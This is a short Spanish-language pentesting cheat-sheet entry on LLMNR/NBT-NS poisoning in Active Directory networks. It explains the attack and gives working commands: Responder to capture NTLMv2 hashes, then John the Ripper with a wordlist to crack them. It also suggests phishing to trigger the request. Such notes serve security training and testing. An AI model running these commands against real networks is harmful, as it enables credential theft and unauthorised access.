# LLMNR - NBTNS Poisoning

Tags: #AD #LLMNR #NBTNS #Poisoning #Kali 

**LLMNR poisoning** es un ataque de red interna donde un atacante responde de forma maliciosa a solicitudes de resolución de nombres cuando un host de Windows intenta acceder a un recurso cuyo nombre no puede resolver mediante DNS. Cuando esto ocurre, Windows utiliza **Link-Local Multicast Name Resolution (LLMNR)** o **NetBIOS Name Service (NBT-NS)** para preguntar en broadcast quién tiene ese recurso. El atacante, usando una herramienta como **Responder**, responde afirmando ser ese host inexistente, lo que provoca que la víctima intente autenticarse mediante **NTLM** contra la máquina del atacante. En ese momento se captura el **hash NTLM**, que luego puede ser crackeado offline o reutilizado en ataques como **Pass-the-Hash**.

```bash  
# Crea múltiples servidores, servicios y se pone a la escucha de múltiples autenticaciones para capturar el 'NTLMv2 Challenge-Response' si el cliente falla al cargar un recurso compartido 

❯ responder -I eth0   
	# f = Fingerprint de la petición del host que utilice LLMNR o NBTNS
	# r = Ver respuestas cuando se usa el protocolo NetBios 


Notas:
	- Se necesita hacer que desde el DC se apunte a un servicio erroneo. Esto se puede lograr desde un phishing o utilizando otras técnicas. 
```

## Crackear el hash con John 

```bash 
❯ john hash   # Crackear el 'NTLMv2 Challenge-Response' para obtener la password 
❯ john hash -w /usr/share/wordlist/rockyou.txt 
❯ john hash --show   # Mirar la password 
```

